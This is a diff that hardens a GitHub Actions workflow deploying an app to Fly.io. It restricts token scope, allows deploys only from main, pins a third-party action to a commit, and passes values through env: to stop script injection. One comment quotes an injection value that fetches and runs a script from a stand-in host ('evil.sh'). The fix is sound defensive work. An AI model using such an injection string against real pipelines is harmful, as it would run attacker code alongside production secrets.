@@ -17,12 +17,35 @@ concurrency:
   group: deploy-frontdoor-measure
   cancel-in-progress: false
 
+# Read the tree and nothing else. Without this block the job runs with the
+# repository's DEFAULT token scope, which is whatever the org setting happens to
+# be -- on many repositories that is write to contents, packages, issues and pull
+# requests, handed to every step including a third-party action.
+permissions:
+  contents: read
+
 jobs:
   deploy:
     runs-on: ubuntu-latest
     timeout-minutes: 20
     environment: production
     steps:
+      # FIRST, before the checkout, because everything after it runs code from
+      # whichever ref was dispatched -- the Dockerfile and fly.toml that flyctl
+      # builds from, above all.
+      #
+      # workflow_dispatch offers a branch picker, so a dispatch from any branch
+      # deployed that branch. It was not even visibly wrong afterwards: the
+      # post-deploy check compares /version against github.sha, which is that
+      # same branch's commit, so the run went green over a host serving code
+      # that never passed review.
+      - name: Refuse to deploy anything but main
+        run: |
+          if [ "$GITHUB_REF" != "refs/heads/main" ]; then
+            echo "::error::this run is on $GITHUB_REF; deploys are only made from refs/heads/main"
+            exit 1
+          fi
+
       - uses: actions/checkout@v4
 
       - name: Refuse to deploy without the token
@@ -36,25 +59,54 @@ jobs:
             exit 1
           fi
 
-      - uses: superfly/flyctl-actions/setup-flyctl@master
+      # Pinned to a commit, not to @master. A moving ref means whatever that
+      # repository holds at dispatch time is downloaded and put on PATH, and the
+      # very next step runs the binary it installed with the production deploy
+      # token in the environment. Nobody here would review that change, because
+      # there is no change here to review.
+      #
+      # ed8efb3 is release 1.6 / v1 of superfly/flyctl-actions, which is also what
+      # master pointed at when this was pinned. To move it: read the diff since
+      # this commit, then update the SHA and this comment together.
+      - uses: superfly/flyctl-actions/setup-flyctl@ed8efb33836e8b2096c7fd3ba1c8afe303ebbff1
 
+      # No `${{ }}` inside a `run:` block, here or below.
+      #
+      # An expression is substituted into the script as TEXT before the shell
+      # sees it, so a value containing a quote or a `$(...)` becomes part of the
+      # command. `inputs.reason` is a free-text box any actor can fill, and
+      # `github.actor` is not ours to constrain either. Passing them through
+      # `env:` and reading them as quoted shell variables means the value is
+      # data no matter what is in it.
+      #
+      # The rule is every expression, not only the two that were exploitable.
+      # Deciding per-expression which contexts are attacker-controlled is a
+      # judgement that has to be re-made correctly on every edit; "none of them,
+      # ever" is a rule a reader can check at a glance, and a test can pin.
       - name: Deploy
         env:
           FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}
+          COMMIT: ${{ github.sha }}
         # --build-arg bakes the commit into the image so /version can report it. Without
         # it the server honestly says "unknown", which is the state #337 was filed for.
         run: >
           flyctl deploy --remote-only --app frontdoor-measure
-          --build-arg FRONTDOOR_COMMIT=${{ github.sha }}
+          --build-arg "FRONTDOOR_COMMIT=$COMMIT"
 
       # The deploy command returning zero only means Fly accepted the image.
-      # These three say the thing a phone actually needs is answering, and the
-      # step fails loudly rather than leaving a green run over a dead demo.
+      # These say the thing a phone actually needs is answering, and the step
+      # fails loudly rather than leaving a green run over a dead demo.
+      #
+      # The manifest and the service worker are in the list because the install
+      # is what they are for: /app answering 200 with a broken /app-manifest.json
+      # is a page that opens in Safari and cannot be added to a home screen, and
+      # a broken /app-sw.js is a page that needs signal. Both fail exactly where
+      # nobody is looking at CI -- on a phone, at the venue.
       - name: Smoke the endpoints a phone uses
         run: |
           set -e
           base=https://frontdoor-measure.fly.dev
-          for path in /health /app /app-icon.png /version; do
+          for path in /health /app /app-icon.png /app-manifest.json /app-sw.js /version; do
             code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 30 --retry 5 --retry-delay 6 --retry-all-errors "$base$path")
             echo "$path -> $code"
             if [ "$code" != "200" ]; then
@@ -67,14 +119,16 @@ jobs:
       # this a build-arg typo leaves /version saying "unknown" and a green run over a server
       # nobody can identify -- which is exactly the state #337 was filed for.
       - name: The server must report the commit we just deployed
+        env:
+          COMMIT: ${{ github.sha }}
         run: |
           set -e
           reported=$(curl -sS --max-time 30 --retry 5 --retry-delay 6 --retry-all-errors \
             https://frontdoor-measure.fly.dev/version \
             | python3 -c 'import json,sys; print(json.load(sys.stdin)["commit"])')
           echo "deployed reports: $reported"
-          if [ "$reported" != "${{ github.sha }}" ]; then
-            echo "::error::/version reports '$reported' but this run deployed ${{ github.sha }}"
+          if [ "$reported" != "$COMMIT" ]; then
+            echo "::error::/version reports '$reported' but this run deployed $COMMIT"
             exit 1
           fi
 
@@ -106,13 +160,21 @@ jobs:
               exit 1 ;;
           esac
 
+      # `${{ inputs.reason }}` and `${{ github.actor }}` used to be pasted
+      # straight into this script. A reason of `"; curl evil.sh | sh; #` ran, in
+      # a job holding the production deploy token, on a summary step that runs
+      # `if: always()` and so could not be avoided by failing earlier.
       - name: Record what was deployed
         if: always()
+        env:
+          REASON: ${{ inputs.reason }}
+          COMMIT: ${{ github.sha }}
+          ACTOR: ${{ github.actor }}
         run: |
           {
             echo "### Deploy"
             echo
-            echo "- Reason: ${{ inputs.reason }}"
-            echo "- Commit: \`${{ github.sha }}\`"
-            echo "- Actor: @${{ github.actor }}"
+            echo "- Reason: $REASON"
+            echo "- Commit: \`$COMMIT\`"
+            echo "- Actor: @$ACTOR"
           } >> "$GITHUB_STEP_SUMMARY"
